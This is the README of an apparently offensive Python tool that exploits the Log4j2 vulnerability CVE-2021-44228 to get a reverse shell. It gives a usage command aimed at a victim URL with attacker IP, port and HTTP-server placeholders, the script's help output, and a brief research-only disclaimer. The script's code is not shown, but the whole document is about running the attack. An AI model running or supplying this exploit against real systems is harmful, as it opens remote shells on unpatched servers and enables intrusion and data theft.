# Log4j2-CVE-2021-44228-revshell

## Usage

    $~ python3 Log4j2-revshell.py -u http://www.victimLog4j.xyz:8080 -l [AttackerIP] -p [AttackerPort] -hp [HTTPServerPort]

    usage: Log4j2-revshell.py [-h] -u TARGET -l LHOST -p LPORT -hp HTTPPORT

    Log4j2 Reverse Shell

    optional arguments:
      -h, --help            show this help message and exit
      -u TARGET, --target TARGET
                            Target URL, http(s)://192.168.90.99:8080
      -l LHOST, --lhost LHOST
                            Attacker IP for receive revshell
      -p LPORT, --lport LPORT
                            Attacker port for receive revshell
      -hp HTTPPORT, --httpport HTTPPORT
                            HTTP server port on attacker host
## Disclaimer:

    The script is for security analysis and research only, hence I would not be liable if it is been used for illicit activities
